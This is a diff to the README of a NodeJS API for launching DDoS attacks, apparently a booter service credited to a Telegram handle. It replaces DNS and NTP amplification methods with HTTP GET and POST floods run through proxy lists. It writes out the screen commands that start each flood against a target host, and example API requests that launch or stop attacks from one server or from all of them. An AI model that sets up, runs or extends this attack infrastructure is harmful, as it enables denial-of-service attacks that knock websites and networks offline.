@@ -1,4 +1,4 @@
-<h2>NodeJS API for Layer 3/4 attacks</h2>
+<h2>NodeJS API for Layer 7 attacks</h2>
 
 <h3>Coded by forky (tg: @yfork)</h3>
 
@@ -36,8 +36,8 @@ npm i express
 
 ```json
 {
-    "DNS": "screen -dmS attack_${attack_id} ./dns_amp ${host} ${port} dns.txt 1 250000 ${time}",
-    "NTP": "screen -dmS attack_${attack_id} ./ntp_amp ${host} ${port} ntp.txt 1 250000 ${time}",
+    "HTTPGET": "screen -dmS attack_${attack_id} ./http ${host} proxies.txt ${time}",
+    "HTTPPOST": "screen -dmS attack_${attack_id} ./http ${host} proxies.txt ${time}",
     "STOP": "screen -dm pkill -f ${host}"
 }
 ```
@@ -83,11 +83,11 @@ Replace `'http://backend:3000/api/attack'` with your API server URL
 
 Send a GET request to the API using the required fields
 
-GET `https://api.yourdomain.com/api/attack?host=1.1.1.1&port=80&time=120&method=DNS&server=alpha`
+GET `https://api.yourdomain.com/api/attack?host=https://website.com&time=120&method=HTTPGET&server=alpha`
 
 You can set &server=all to launch to all servers
 
 You can stop the attacks by sending a GET request to the API using &method=stop
 
-GET `https://api.yourdomain.com/api/attack?host=1.1.1.1&port=80&time=120&method=stop&server=alpha`
+GET `https://api.yourdomain.com/api/attack?host=https://website.com&time=120&method=stop&server=alpha`
 
